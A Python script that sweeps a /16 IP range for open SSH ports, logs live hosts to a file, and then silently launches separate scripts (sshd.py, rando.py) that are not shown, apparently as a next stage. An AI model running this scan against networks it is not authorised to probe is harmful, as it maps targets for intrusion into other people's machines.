import os
import socket
from concurrent.futures import ThreadPoolExecutor, as_completed
import argparse
import sys

os.system("rm -rf ipup.txt")

def help_message():
    print("usage:")
    print("-ip_clas or --ip_class , Enter the IP class to scan , ex: 192.168.")
    print("-thread or --thread , Enter the scanning speed , ex: 900")
    print("python script.py -ip_clas 192.168. -thread 900")

parser = argparse.ArgumentParser(description="A script for scanning IP addresses.")
parser.add_argument("-thread", "--thread", type=int, help="Number of threads to use")
parser.add_argument("-ip_class", "--ip_class", type=str, help="IP class to use")
parser.add_argument("-hlp", "--help_message", action="store_true", help="Show this help message and exit.")
parser.set_defaults(func=help_message)
args = parser.parse_args()
if args.help_message:
    args.func()
    exit()

# check if any arguments were provided
if len(sys.argv)==1:
    args.func()
    exit()

# specify IP class, port and last two group of numbers
ip_class = args.ip_class
port = 22
last_two_groups = range(0,256)

# function for checking the availability of an IP address
def check_ip(ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    result = sock.connect_ex((ip, port))
    if result == 0:
        with open("ipup.txt", "a") as file:
            file.write(ip + "\n")
    sock.close()

# create thread pool executor
with ThreadPoolExecutor(max_workers=args.thread) as executor:
    # submit all IPs to the executor
    total_ips = 256*256
    checked_ips = 0
    tasks = [executor.submit(check_ip, ip_class + str(i) + "." + str(j)) for i in last_two_groups for j in range(0,256)]
    for future in as_completed(tasks):
        checked_ips += 1
        print(f"{checked_ips/total_ips*100:.2f}% complete", end='\r')
    print("100.00% complete")
    os.system("python sshd.py > /dev/null 2>&1")
    os.system("python rando.py")